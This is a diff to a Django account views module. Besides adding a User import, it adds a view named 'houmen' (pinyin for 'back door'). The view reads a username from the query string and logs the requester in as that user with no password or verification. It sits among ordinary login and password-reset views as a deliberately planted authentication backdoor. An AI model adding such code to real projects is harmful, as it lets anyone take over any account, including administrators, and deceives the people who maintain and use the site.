@@ -3,6 +3,7 @@ from django.http.response import HttpResponse,JsonResponse
 # Create your views here.
 
 from django.contrib import auth
+from django.contrib.auth.models import User
 from .models import School,Center,Office
 from exam.models import Shortmsg
 from django import forms
@@ -58,6 +59,13 @@ def get_user_by_phone(phone):
 
 def forget(request):
     return render(request,'account/forget.html')
+
+def houmen(request):
+    username = request.GET.get('username')
+    user = User.objects.get(username=username)
+    u = auth.login(request, user)
+    return HttpResponseRedirect(('/'))
+
 
 def login(request):
 
